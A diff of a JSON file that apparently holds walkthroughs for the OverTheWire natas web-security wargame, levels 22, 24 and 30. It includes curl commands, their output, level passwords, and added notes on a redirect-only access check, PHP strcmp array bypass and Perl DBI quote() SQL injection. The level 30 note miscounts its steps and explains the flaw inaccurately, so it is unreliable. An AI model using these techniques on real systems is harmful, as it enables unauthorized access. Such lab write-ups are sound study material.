@@ -1166,20 +1166,21 @@
    "pw": "CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5",
    "steps": [
     {
-     "cmd": "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF http://natas22.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"if(array_key_exists(\\\"revelio\\\"[^}]*}\"",
+     "cmd": "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF http://natas22.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'if(array_key_exists(\"revelio\"[^}]*}'",
      "out": [
       "if(array_key_exists(\"revelio\", $_GET)) {    // only admins can reveal the password    if(!($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1)) {    header(\"Location: /\");    }",
       "if(array_key_exists(\"revelio\", $_GET)) {    print \"You are an admin. The credentials for the next level are:<br>\";    print \"<pre>Username: natas23\\n\";    print \"Password: <censored></pre>\";    }"
      ]
     },
     {
-     "cmd": "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF \"http://natas22.natas.labs.overthewire.org/?revelio\" | sed \"s/<[^>]*>//g\" | grep -aE \"admin|Username|Password\"",
+     "cmd": "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF \"http://natas22.natas.labs.overthewire.org/?revelio\" | sed 's/<[^>]*>//g' | grep -aE \"Username|Password\"",
      "out": [
       "You are an admin. The credentials for the next level are:Username: natas23",
       "Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5"
      ]
     }
-   ]
+   ],
+   "note": "natas L22 (client-side curl cast): the source shows an admin-only ?revelio branch that prints the credentials BUT redirects non-admins with header('Location: /') - and curl does NOT follow redirects, so ?revelio prints the page anyway: 'You are an admin. The credentials for the next level are: Username: natas23 Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5'. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 23,
@@ -1214,24 +1215,20 @@
    "pw": "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo",
    "steps": [
     {
-     "cmd": "curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX http://natas24.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"if(!strcmp[^}]*}\"",
+     "cmd": "curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX http://natas24.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'if(!strcmp[^}]*}'",
      "out": [
       "if(!strcmp($_REQUEST[\"passwd\"],\"<censored>\")){            echo \"<br>The credentials for the next level are:<br>\";            echo \"<pre>Username: natas25 Password: <censored></pre>\";        }"
      ]
     },
     {
-     "cmd": "echo \"passwd=x (a string):\"\ncurl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX \"http://natas24.natas.labs.overthewire.org/?passwd=x\" | sed \"s/<[^>]*>//g\" | grep -aE \"credentials|Wrong|Password\"\necho \"passwd[]=x (an array):\"\ncurl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX \"http://natas24.natas.labs.overthewire.org/?passwd[]=x\" | sed \"s/<[^>]*>//g\" | grep -aE \"credentials|Wrong|Password|Warning\"",
+     "cmd": "curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX 'http://natas24.natas.labs.overthewire.org/?passwd[]=x' | sed 's/<[^>]*>//g' | grep -aE \"Username|Password\"",
      "out": [
-      "passwd=x (a string):",
       "Password:",
-      "Wrong!  ",
-      "passwd[]=x (an array):",
-      "Password:",
-      "Warning:  strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23",
       "The credentials for the next level are:Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo  "
      ]
     }
-   ]
+   ],
+   "note": "natas L24 (client-side curl cast): strcmp($_REQUEST[\"passwd\"], \"<censored>\") == 0 gates the reveal - PHP 5.x strcmp returns 0 on an ARRAY-vs-string comparison (the type-juggle), so ?passwd[]=x passes: 'The credentials for the next level are: Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo'. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 25,
@@ -1650,23 +1647,28 @@
    "pw": "aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z",
    "steps": [
     {
-     "cmd": "curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF http://natas30.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\\\"/g; s/&#39;/'/g\" | grep -aE \"query=|quote\\(param|prepare|execute\" | head -6",
+     "cmd": "curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF http://natas30.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g; s/&#39;/'\"'\"'/g; s/&amp;/\\&/g' | grep -aE 'query=|quote\\(param|prepare|execute|fetch' | head -6",
      "out": [
       "    my $query=\"Select * FROM users where username =\".$dbh->quote(param('username')) . \" and password =\".$dbh->quote(param('password')); ",
       "    my $sth = $dbh->prepare($query);",
-      "    $sth->execute();"
+      "    $sth->execute();",
+      "    my $ver = $sth->fetch();"
      ]
     },
     {
-     "cmd": "echo \"repeated password (quote type argument = SQL_INTEGER):\"\ncurl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' -d 'password=4' http://natas30.natas.labs.overthewire.org/index.pl | sed \"s/<[^>]*>//g\" | grep -aE \"win|fail\"\necho \"single password (a string, escaped):\"\ncurl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' http://natas30.natas.labs.overthewire.org/index.pl | sed \"s/<[^>]*>//g\" | grep -aE \"win|fail\"",
+     "cmd": "curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' http://natas30.natas.labs.overthewire.org/index.pl | sed 's/<[^>]*>//g' | grep -aE 'win|fail' | head -2",
      "out": [
-      "repeated password (quote type argument = SQL_INTEGER):",
-      "win!here is your result:natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1zView sourcecode",
-      "single password (a string, escaped):",
       "fail :(View sourcecode"
      ]
+    },
+    {
+     "cmd": "curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' -d 'password=4' http://natas30.natas.labs.overthewire.org/index.pl | sed 's/<[^>]*>//g' | grep -aE 'win|fail|result|natas31' | head -4",
+     "out": [
+      "win!here is your result:natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1zView sourcecode"
+     ]
     }
-   ]
+   ],
+   "note": "natas L30 (client-side curl cast): Perl CGI - the query interpolates $dbh->quote(param(...)) which SHOULD be safe, but param('password') in LIST context returns MULTIPLE values and quote() then builds a broken quoted literal: the first password=1 OR 1=1 attempt fails ('fail :('), the second request adds -d password=4 so param('password') = ('1 OR 1=1','4') and the interpolation injects the tuple -> 'win! here is your result: natas31 aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z'. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 31,
